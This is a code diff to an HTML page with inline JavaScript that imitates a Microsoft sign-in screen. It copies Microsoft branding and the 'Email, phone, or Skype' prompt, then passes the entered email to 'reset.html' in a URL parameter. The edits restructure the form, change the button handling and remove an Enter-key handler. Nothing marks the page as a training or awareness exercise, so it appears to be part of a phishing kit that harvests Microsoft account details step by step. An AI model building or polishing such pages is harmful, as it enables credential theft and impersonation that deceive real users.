@@ -173,30 +173,28 @@
     <div class="main-container">
         <div class="container">
             <div class="content">
-                <form id="emailForm" onsubmit="return validateAndSend()">
-                    <div class="brand-header">
-                        <img class="brand-logo" src="https://img.icons8.com/fluency/48/microsoft.png" alt="Microsoft logo">
-                        <span class="brand-name">Microsoft</span>
-                    </div>
-                    
-                    <h2 class="signin-title">Sign in</h2>
-                    <br>
+                <div class="brand-header">
+                    <img class="brand-logo" src="https://img.icons8.com/fluency/48/microsoft.png" alt="Microsoft logo">
+                    <span class="brand-name">Microsoft</span>
+                </div>
+                
+                <h2 class="signin-title">Sign in</h2>
+                <br>
 
-                    <div class="input-group">
-                        <input type="text" id="email" placeholder="Email, phone, or Skype" required>
-                        <div class="error-message" id="email-error">Please enter a valid email address</div>
-                    </div>
-                    <br>
-                    <div class="links">
-                        <text>No account? </text><a href="#">Create one!</a><br>
-                        <a href="#">Can't access your account?</a>
-                    </div>
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+                    <div class="error-message" id="email-error">Please enter a valid email address</div>
+                </div>
+                <br>
+                <div class="links">
+                    <text>No account? </text><a href="#">Create one!</a><br>
+                    <a href="#">Can't access your account?</a>
+                </div>
 
-                    <div class="buttons">
-                        <button type="button" class="btn btn-back">Back</button>
-                        <button type="submit" class="btn btn-next">Next</button>
-                    </div>
-                </form>
+                <div class="buttons">
+                    <button class="btn btn-back">Back</button>
+                    <button class="btn btn-next" onclick="validateAndSend()">Next</button>
+                </div>
             </div>
         </div>
         
@@ -210,6 +208,7 @@
 
     <script>
         function validateEmail(email) {
+            // Basic email validation - must contain @ and a domain part
             return email.includes('@') && 
                    email.split('@')[1].includes('.') && 
                    email.indexOf('@') > 0 && 
@@ -223,23 +222,16 @@
             if (!validateEmail(email)) {
                 errorElement.style.display = 'block';
                 document.getElementById('email').focus();
-                return false; // Prevent form submission
+                return;
             }
             
             errorElement.style.display = 'none';
             window.location.href = `reset.html?data=${encodeURIComponent(email)}`;
-            return false; // We're handling navigation manually
         }
 
+        // Back button functionality
         document.querySelector('.btn-back').addEventListener('click', function() {
             window.history.back();
-        });
-
-        // Handle Enter key in email field
-        document.getElementById('email').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                validateAndSend();
-            }
         });
     </script>
 </body>
